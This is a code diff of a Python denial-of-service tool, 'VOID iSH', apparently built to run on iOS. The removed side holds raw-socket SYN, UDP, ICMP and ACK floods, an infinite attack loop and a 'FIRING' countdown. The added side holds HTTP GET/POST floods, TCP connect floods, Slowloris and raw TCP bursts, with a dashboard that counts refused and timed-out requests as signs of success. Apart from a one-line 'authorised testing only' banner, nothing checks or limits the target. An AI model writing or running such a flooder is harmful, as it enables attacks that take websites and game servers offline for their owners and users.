-        style="dim red")))
-    console.print(Rule(style="bright_red"))
 
 MODES = {
-    "1": {"label": "SYN Flood",  "key": "SYN",  "color": "bright_red",
-          "desc":  "Fake TCP handshakes — fills connection table, real users can't connect",
-          "example": "Like calling a number 10,000x/sec so no one else gets through"},
-    "2": {"label": "UDP Flood",  "key": "UDP",  "color": "bright_cyan",
-          "desc":  "Random UDP datagrams — eats all available bandwidth",
-          "example": "Like flooding a mailbox with junk so real mail can't arrive"},
-    "3": {"label": "ICMP Flood", "key": "ICMP", "color": "yellow",
-          "desc":  "Rapid ICMP echo requests — overwhelms the network interface",
-          "example": "Like spamming pings until the server can't respond to anything"},
-    "4": {"label": "ACK Flood",  "key": "ACK",  "color": "bright_magenta",
-          "desc":  "Fake TCP acknowledgements — confuses stateful firewalls",
-          "example": "Like replying 'I got it' to thousands of messages nobody sent"},
-    "5": {"label": "HTTP Flood", "key": "HTTP", "color": "bright_green",
-          "desc":  "Layer 7 — opens real TCP connections and sends HTTP GET requests (best vs websites)",
-          "example": "Like reloading a webpage thousands of times per second"},
+    "1": {
+        "label":      "HTTP GET Flood",
+        "color":      "bright_red",
+        "desc":       "Spam randomised GET requests — hammers web server & app layer",
+        "worker":     _worker_http_get,
+        "needs_host": True,
+    },
+    "2": {
+        "label":      "HTTP POST Flood",
+        "color":      "bright_cyan",
+        "desc":       "POST random form data — burns CPU on server-side processing",
+        "worker":     _worker_http_post,
+        "needs_host": True,
+    },
+    "3": {
+        "label":      "TCP Connect Flood",
+        "color":      "bright_yellow",
+        "desc":       "Rapid TCP connects — exhausts server connection pool",
+        "worker":     _worker_tcp_connect,
+        "needs_host": False,
+    },
+    "4": {
+        "label":      "Slowloris",
+        "color":      "bright_magenta",
+        "desc":       "Hold connections open forever — starves thread-per-conn servers",
+        "worker":     _worker_slowloris,
+        "needs_host": True,
+    },
+    "5": {
+        "label":      "HTTP HEAD Flood",
+        "color":      "bright_green",
+        "desc":       "Ultra-fast HEAD requests — max req/s with minimal bandwidth",
+        "worker":     _worker_http_head,
+        "needs_host": True,
+    },
+    "6": {
+        "label":      "Raw TCP Burst",
+        "color":      "orange1",
+        "desc":       "Hand-crafted HTTP over raw socket — bypasses requests lib overhead",
+        "worker":     _worker_raw_tcp,
+        "needs_host": True,
+    },
 }
 
-def show_mode_menu():
+# ══════════════════════════════════════════════════════════════════
+# BANNER & UI
+# ══════════════════════════════════════════════════════════════════
+
+def show_banner():
+    console.clear()
     console.print()
-    console.print(Rule("[dim red]  SELECT FLOOD TYPE  [/]", style="dim red"))
+    console.print(Rule(style="bright_red"))
+    console.print()
+    for line in [
+        "██╗   ██╗ ██████╗ ██╗██████╗     ██╗███████╗██╗  ██╗",
+        "██║   ██║██╔═══██╗██║██╔══██╗    ██║██╔════╝██║  ██║",
+        "██║   ██║██║   ██║██║██║  ██║    ██║███████╗███████║",
+        "╚██╗ ██╔╝██║   ██║██║██║  ██║    ██║╚════██║██╔══██║",
+        " ╚████╔╝ ╚██████╔╝██║██████╔╝    ██║███████║██║  ██║",
+        "  ╚═══╝   ╚═════╝ ╚═╝╚═════╝     ╚═╝╚══════╝╚═╝  ╚═╝",
+    ]:
+        console.print(Align.center(f"[bold bright_red]{line}[/]"))
+    console.print()
+    console.print(Align.center("[dim]i S H  ·  i O S  E d i t i o n  ·  L a y e r - 7  S t r e s s[/]"))
+    console.print(Align.center("[dim red]@lfw.k4rma_   ·   for authorised testing only[/]"))
+    console.print()
+    console.print(Rule(style="bright_red"))
+    console.print()
+
+def show_mode_menu():
+    console.print(Rule("[dim red]  SELECT MODE  [/]", style="dim red"))
     console.print()
     for num, m in MODES.items():
-        console.print(f"  [bright_red][{num}][/]  [bold {m['color']}]{m['label']}[/]")
+        console.print(f"  [bright_red]\\[{num}][/]  [bold {m['color']}]{m['label']}[/]")
         console.print(f"       [dim]{m['desc']}[/]")
-        console.print(f"       [dim italic]\"{m['example']}\"[/]")
         console.print()
+
+def _bar(ratio: float, width: int = 24, col: str = "bright_red") -> Text:
+    ratio  = max(0.0, min(ratio, 1.0))
+    filled = int(ratio * width)
+    b = Text()
+    b.append("█" * filled,            style=col)
+    b.append("░" * (width - filled),  style="dim")
+    return b
+
+def _fmt_bytes(b: float) -> str:
+    if b < 1024:     return f"{b:.0f} B/s"
+    if b < 1024**2:  return f"{b/1024:.1f} KB/s"
+    return                   f"{b/1024**2:.2f} MB/s"
+
+def _make_panel(snap: dict, label: str, col: str) -> Panel:
+    t = Table(box=box.SIMPLE, show_header=False, padding=(0, 2))
+    t.add_column(style="dim",        no_wrap=True)
+    t.add_column(style="bold white", no_wrap=True)
+    t.add_column(no_wrap=True)
+
+    sent     = snap["sent"]
+    ok       = snap["success"]
+    refused  = snap["refused"]
+    timeout  = snap["timeout"]
+    err      = snap["errors"]
+    pps      = snap["pps"]
+    bps      = snap["bps"]
+
+    ok_r  = ok      / max(sent, 1)
+    ref_r = refused / max(sent, 1)
+    to_r  = timeout / max(sent, 1)
+
+    t.add_row("Mode",     f"[bold {col}]{label}[/]",                 "")
+    t.add_row("Elapsed",  f"{snap['elapsed']:.0f}s",                 "")
+    t.add_row("Sent",     f"{sent:,}",                               "")
+    t.add_row("Success",  f"[green]{ok:,}[/]",
+              _bar(ok_r,  16, "green"))
+    # Refused = packet reached server (flood is working)
+    t.add_row("Refused",  f"[yellow]{refused:,}[/]  [dim](hit server)[/]",
+              _bar(ref_r, 16, "yellow"))
+    t.add_row("Timeout",  f"[red]{timeout:,}[/]  [dim](dropped)[/]",
+              _bar(to_r,  16, "red"))
+    if err:
+        t.add_row("Other err", f"[dim red]{err:,}[/]",              "")
+    t.add_row("Req/s",    f"[bright_red]{pps:,.1f}[/]",
+              _bar(min(pps / 500, 1.0), 16, col))
+    t.add_row("Bandwidth",f"[cyan]{_fmt_bytes(bps)}[/]",             "")
+    return Panel(t, title=f"[bold {col}]VOID STRESS — iSH[/]",
+                 border_style=col, padding=(0, 1))
+
+# ══════════════════════════════════════════════════════════════════
+# RESOLVE
+# ══════════════════════════════════════════════════════════════════
 
 def resolve(target: str) -> str:
     if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", target):
         return target
     try:
         ip = socket.gethostbyname(target)
-        console.print(f"  [dim]Resolved:[/]  [bold yellow]{target}[/] → [bright_white]{ip}[/]")
+        console.print(f"  [dim]Resolved:[/]  [bold yellow]{target}[/] → [white]{ip}[/]")
         return ip
     except Exception:
-        return target
+        console.print(f"  [red]✘  Could not resolve[/] [bold]{target}[/]")
+        sys.exit(1)
 
 # ══════════════════════════════════════════════════════════════════
-# RUN — INFINITE ATTACK LOOP
+# RUN
 # ══════════════════════════════════════════════════════════════════
 
-N_THREADS       = 128          # sender threads
-POOL_SIZE       = 1000         # pre-built packets per thread
-BATCH_REPORT    = 100          # report every 100 packets — less lock contention
-SOCKET_BUF_SIZE = 8*1024*1024  # 8MB socket buffer
+def run(target_ip: str, target_host: str, port: int, mode: dict, n_threads: int):
+    stop_event.clear()
+    stats  = Stats()
+    label  = mode["label"]
+    col    = mode["color"]
+    worker = mode["worker"]
 
-def run(target: str, port: int, mode: dict):
-    stats     = Stats()
-    mode_key  = mode["key"]
-    col       = mode["color"]
-    label     = mode["label"]
-
-    # Spawn sender threads
-    senders = []
-    for _ in range(N_THREADS):
-        t = threading.Thread(
-            target=_sender,
-            args=(target, port, mode_key, stats),
-            daemon=True
-        )
+    threads = []
+    for _ in range(n_threads):
+        args = (target_ip, port, target_host, stats) if mode["needs_host"] \
+               else (target_ip, port, stats)
+        t = threading.Thread(target=worker, args=args, daemon=True)
         t.start()
-        senders.append(t)
+        threads.append(t)
 
-    # Spawn reply listener
-    lt = threading.Thread(
-        target=_listener,
-        args=(target, port, mode_key, stats),
-        daemon=True
-    )
-    lt.start()
+    console.print()
+    console.print(Rule(f"[bold {col}]  {label}  [/]", style=col))
+    console.print(f"  [dim]Target  [/]  [bold white]{target_host}[/]  [dim]({target_ip}:{port})[/]")
+    console.print(f"  [dim]Threads [/]  [bold white]{n_threads}[/]")
+    console.print(Rule(style=col))
+    console.print()
+    console.print("  [dim]Ctrl+C to stop[/]")
+    console.print()
 
-    # Stop-on-input listener
-    def _input_watch():
-        while not stop_event.is_set():
-            try:
-                if input().strip().lower() == "stop":
-                    stop_event.set()
-            except Exception:
-                break
-    threading.Thread(target=_input_watch, daemon=True).start()
-
-    # Rich Live dashboard
     try:
-        from rich.console import Group
-        with Live(
-            console=console,
-            refresh_per_second=4,
-            screen=False,
-        ) as live:
-            while not stop_event.is_set():
-                snap  = stats.snapshot()
-                pps   = stats.pps()
-                sent  = snap["sent"]
-                reps  = snap["replies"]
-                elap  = snap["elapsed"]
-                last_f= snap["last_flag"]
-                loss  = ((sent - reps) / sent * 100) if sent else 100.0
-
-                rate_ratio  = min(pps / 100_000, 1.0)
-                reply_ratio = min(reps / max(sent, 1), 1.0)
-
-                rate_bar = Text()
-                rate_bar.append("  RATE   ", style="bold white")
-                rate_bar.append_text(_bar(rate_ratio, col=col))
-                rate_bar.append(f"  {pps:,.0f} pps", style=f"bold {col}")
-
-                rep_bar = Text()
-                rep_bar.append("  REPLY  ", style="bold white")
-                rep_bar.append_text(_bar(reply_ratio, col="bright_green"))
-                rep_bar.append(f"  {reps:,}", style="bold bright_green")
-
-                last_row = Text()
-                if last_f:
-                    last_row.append("  LAST   ", style="bold white")
-                    last_row.append(f"{last_f}  ", style="bold yellow")
-                    last_row.append(f"→ {_flag_meaning(last_f)}", style="dim")
-                else:
-                    last_row.append("  LAST   ", style="bold white")
-                    last_row.append("waiting for reply...", style="dim")
-
-                tbl = Table.grid(padding=(0, 2))
-                tbl.add_column(); tbl.add_column()
-                tbl.add_column(); tbl.add_column()
-                tbl.add_row(
-                    Text("TARGET",  style="dim"),
-                    Text(f"{target}:{port}", style="bold yellow"),
-                    Text("MODE",    style="dim"),
-                    Text(label, style=f"bold {col}"),
-                )
-                tbl.add_row(
-                    Text("SENT",    style="dim"),
-                    Text(f"{sent:,}", style="bold white"),
-                    Text("RATE",    style="dim"),
-                    Text(f"{pps:,.0f} pps", style="bold bright_red"),
-                )
-                tbl.add_row(
-                    Text("REPLIES", style="dim"),
-                    Text(f"{reps:,}", style="bold bright_green"),
-                    Text("LOSS",    style="dim"),
-                    Text(f"{loss:.1f}%",
-                         style="bright_green" if loss < 20 else
-                               ("yellow" if loss < 60 else "bright_red")),
-                )
-                tbl.add_row(
-                    Text("THREADS", style="dim"),
-                    Text(f"{N_THREADS} senders", style="bold white"),
-                    Text("UP",      style="dim"),
-                    Text(f"{elap:.0f}s", style="bold white"),
-                )
-
-                panel = Panel(
-                    Group(tbl, Text(""), rate_bar, rep_bar, last_row,
-                          Text(""), Text("  type stop + Enter or Ctrl+C to halt", style="dim red")),
-                    title="[bold bright_red]  VOID STRESS TEST  —  ∞ INFINITE  [/]",
-                    border_style="bright_red",
-                    box=box.DOUBLE_EDGE,
-                )
-                live.update(panel)
+        with Live(console=console, refresh_per_second=4, screen=False) as live:
+            while True:
+                live.update(_make_panel(stats.snap(), label, col))
                 time.sleep(0.25)
-
     except KeyboardInterrupt:
+        pass
+    finally:
         stop_event.set()
 
-    # Wait for threads
-    for t in senders:
-        t.join(timeout=1.0)
+    # ── summary ───────────────────────────────────────────────────
+    snap = stats.snap()
 
-    # Final summary
-    snap  = stats.snapshot()
-    pps   = stats.pps()
-    sent  = snap["sent"]
-    reps  = snap["replies"]
-    elap  = snap["elapsed"]
-    loss  = ((sent - reps) / sent * 100) if sent else 100.0
-    pps_a = sent / elap if elap else 0
-
-    console.print()
-    console.print(Rule("[bold bright_red]  SESSION SUMMARY  [/]", style="bright_red"))
-    console.print()
-    console.print(f"  [dim]Target          [/]  [bold yellow]{target}:{port}[/]")
-    console.print(f"  [dim]Mode            [/]  [bold {col}]{label}[/]")
-    console.print(f"  [dim]Engine          [/]  [bold white]Pure Python raw sockets ({N_THREADS} threads)[/]")
-    console.print(f"  [dim]Packets sent    [/]  [bold white]{sent:,}[/]")
-    console.print(f"  [dim]Replies received[/]  [bold white]{reps:,}[/]")
-    console.print(f"  [dim]Packet loss     [/]  "
-                  f"[{'bright_green' if loss<20 else 'bright_red'}]{loss:.1f}%[/]")
-    console.print(f"  [dim]Avg rate        [/]  [bold white]{pps_a:,.0f} pps[/]")
-    console.print(f"  [dim]Duration        [/]  [bold white]{elap:.1f}s[/]")
-    console.print()
-
-    if loss >= 80:
-        v = "[bold bright_red]Server dropped most packets — firewall or port closed[/]"
-    elif loss >= 40:
-        v = "[bold yellow]Server struggling — high packet loss detected[/]"
-    elif reps > 0 and loss < 20:
-        v = "[bold bright_green]Server responding — packets getting through[/]"
-    else:
-        v = "[bold dim]No significant reply data captured[/]"
-
-    console.print(f"  [dim]Verdict  [/]  {v}")
     console.print()
     console.print(Rule(style="bright_red"))
+    console.print(Align.center("[bold white]SESSION SUMMARY[/]"))
+    console.print(Rule(style="bright_red"))
+    console.print()
+
+    ref_pct = snap["refused"] / max(snap["sent"], 1) * 100
+    to_pct  = snap["timeout"] / max(snap["sent"], 1) * 100
+
+    tbl = Table(box=box.SIMPLE, show_header=False, padding=(0, 2))
+    tbl.add_column(style="dim",        no_wrap=True)
+    tbl.add_column(style="bold white", no_wrap=True)
+    tbl.add_row("Target",        f"{target_host} ({target_ip}:{port})")
+    tbl.add_row("Mode",          f"[bold {col}]{label}[/]")
+    tbl.add_row("Duration",      f"{snap['elapsed']:.1f}s")
+    tbl.add_row("Total Sent",    f"{snap['sent']:,}")
+    tbl.add_row("Success",       f"[green]{snap['success']:,}[/]")
+    tbl.add_row("Refused",       f"[yellow]{snap['refused']:,} ({ref_pct:.1f}%)[/]  [dim]← hit server[/]")
+    tbl.add_row("Timeout",       f"[red]{snap['timeout']:,} ({to_pct:.1f}%)[/]  [dim]← dropped[/]")
+    tbl.add_row("Avg Req/s",     f"[bright_red]{snap['pps']:,.1f}[/]")
+    tbl.add_row("Avg Bandwidth", f"[cyan]{_fmt_bytes(snap['bps'])}[/]")
+    tbl.add_row("Total Data",    f"[cyan]{snap['bytes']/1024:.1f} KB[/]")
+    console.print(Align.center(tbl))
+    console.print()
+    console.print(Rule(style="bright_red"))
+    console.print()
 
 # ══════════════════════════════════════════════════════════════════
 # MAIN
 # ══════════════════════════════════════════════════════════════════
 
 def main():
-    import argparse
-    parser = argparse.ArgumentParser(add_help=False)
-    parser.add_argument("--target", default="")
-    parser.add_argument("--port",   default="")
-    parser.add_argument("--mode",   default="")
-    args, _ = parser.parse_known_args()
+    show_banner()
 
-    # Root check (HTTP mode doesn't need root, raw socket modes do)
-    if os.geteuid() != 0 and args.mode != "5":
-        banner()
-        console.print(f"\n  [bold red][!][/]  Raw sockets need root.\n"
-                      f"  [dim]Fix:  sudo python3 ddos_simple.py[/]\n")
-        return
+    console.print("  [bright_red]◈[/]  [bold white]Target IP / hostname:[/]  ", end="")
+    raw_target = input().strip()
+    if not raw_target:
+        console.print("  [red]✘  No target entered.[/]"); sys.exit(1)
 
-    banner()
-    console.print()
-
-    # Target
-    if args.target:
-        target = resolve(args.target)
-        console.print(f"  [dim]Target:[/] [bold yellow]{target}[/]")
-    else:
-        console.print("  [bright_red]◈[/]  ", end="")
-        raw_t = input("Target IP, hostname, or URL: ").strip()
-        if not raw_t:
-            console.print("  [red]No target. Abort.[/]"); return
-        raw_t = re.sub(r'^https?://', '', raw_t).split('/')[0].split(':')[0]
-        target = resolve(raw_t)
-
-    # Port
-    if args.port.isdigit():
-        port = int(args.port)
-        console.print(f"  [dim]Port:[/] [bold yellow]{port}[/]")
-    else:
-        console.print("  [bright_red]◈[/]  ", end="")
-        port_raw = input("Port (80 for websites, 443 HTTPS, 25565 Minecraft): ").strip()
-        port = int(port_raw) if port_raw.isdigit() else 80
-
-    # Mode
-    if args.mode in MODES:
-        mode = MODES[args.mode]
-        console.print(f"  [dim]Mode:[/]  [bold {mode['color']}]{mode['label']}[/]")
-    else:
-        show_mode_menu()
-        console.print("  [bright_red]◈[/]  ", end="")
-        choice = input("Choice (1-5, default 1): ").strip()
-        mode = MODES.get(choice, MODES["1"])
-
-    # Confirm
-    console.print()
-    console.print(Rule("[dim red]  CONFIRM  [/]", style="dim red"))
-    console.print(f"  [dim]Target [/]  [bold yellow]{target}:{port}[/]")
-    console.print(f"  [dim]Mode   [/]  [bold {mode['color']}]{mode['label']}[/]  "
-                  f"[dim]— {mode['desc']}[/]")
-    console.print(f"  [dim]Engine [/]  [bold white]Pure Python raw sockets · {N_THREADS} threads · ∞ infinite[/]")
-    console.print()
-    console.print("  [bright_red]◈[/]  ", end="")
-    confirm = input("Start? (Y/N): ").strip().lower()
-    if confirm not in ("y", "yes"):
-        console.print("\n  [yellow]Aborted.[/]\n"); return
-
-    # Geo attack map
-    show_geo_attack_map(target, mode["label"], mode["color"])
-
-    # Countdown
-    for i in range(3, 0, -1):
-        console.print(f"\r  [bold bright_red][!][/]  [bold white]Firing in [bright_red]{i}[/]...[/]", end="")
-        time.sleep(1)
-    console.print(f"\r  [bold bright_red][!!!][/]  [bold bright_red]FIRING — {N_THREADS} THREADS — RAW SOCKETS             [/]")
-    console.print()
-
+    console.print("  [bright_red]◈[/]  [bold white]Port (default 80):[/]  ", end="")
+    raw_port = input().strip()
     try:
-        run(target, port, mode)
-    except KeyboardInterrupt:
-        stop_event.set()
-        console.print("\n  [yellow]Stopped.[/]\n")
+        port = int(raw_port) if raw_port else 80
+    except ValueError:
+        console.print("  [red]✘  Invalid port.[/]"); sys.exit(1)
+
+    console.print()
+    target_host = raw_target
+    target_ip   = resolve(raw_target)
+
+    console.print()
+    show_mode_menu()
+    console.print("  [bright_red]◈[/]  [bold white]Mode (1–6, default 1):[/]  ", end="")
+    mode = MODES.get(input().strip(), MODES["1"])
+
+    console.print("  [bright_red]◈[/]  [bold white]Threads (default 16, max 64):[/]  ", end="")
+    try:
+        n_threads = int(input().strip() or "16")
+        n_threads = max(1, min(n_threads, 64))
+    except ValueError:
+        n_threads = 16
+
+    run(target_ip, target_host, port, mode, n_threads)
 
 if __name__ == "__main__":
-    try:
-        main()
-    except Exception as e:
-        console.print(f"\n  [bold red][!][/]  {e}\n")
+    main()
